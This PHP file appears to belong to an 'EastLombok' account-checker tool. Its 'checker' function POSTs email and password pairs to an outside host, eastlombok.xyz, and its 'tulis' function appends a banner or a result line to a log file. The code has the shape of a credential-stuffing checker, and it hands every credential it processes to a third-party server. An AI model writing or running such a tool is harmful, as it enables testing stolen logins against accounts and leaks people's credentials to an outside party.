<?php


function checker($email,$password,$token){
	$curl = curl_init();

	curl_setopt_array($curl, array(
		CURLOPT_URL => "http://eastlombok.xyz/restApi/api.php?check=md5&key=$token&tipe=decrypt",
		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_ENCODING => "",
		CURLOPT_MAXREDIRS => 10,
		CURLOPT_TIMEOUT => 0,
		CURLOPT_FOLLOWLOCATION => true,
		CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => "email=$email&password=$password",
		CURLOPT_HTTPHEADER => array(
			"Content-Type: application/x-www-form-urlencoded"
		),
	));

	$response = curl_exec($curl);
	$decode = json_decode($response, true);
	curl_close($curl);
	return $decode;

}

function tulis($tipe, $data = null, $path){
	if ($tipe == "copret") {
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, "================Tool EastLombok===============\n=====created by: sayidina ahmadal qoqosyi=====\n\n");
		fclose($file);
	}else{
		$namaFile = $path;
		$file = fopen($namaFile, "a");
		fwrite($file, $data."\n");
		fclose($file);
	}
}